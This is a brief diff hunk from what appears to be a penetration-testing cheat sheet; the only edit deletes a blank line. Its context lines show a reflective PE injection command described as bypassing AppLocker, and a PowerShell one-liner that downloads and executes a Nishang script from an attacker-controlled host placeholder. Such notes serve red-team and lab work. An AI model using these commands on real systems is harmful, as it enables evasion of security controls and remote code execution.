@@ -36,6 +36,5 @@
 # Reflective Execution (Can Bypass Applocker)
 `Invoke-reflectivePEInjection -PEBytes ([IO.File]::ReadAllBytes('<PATH_TO_EXE>'))`
 
-
 # CMD to powershell
 `powershell "IEX(New-Object Net.webClient).downloadString('http://<LHOST>:<LPORT>/nishang.ps1')"`
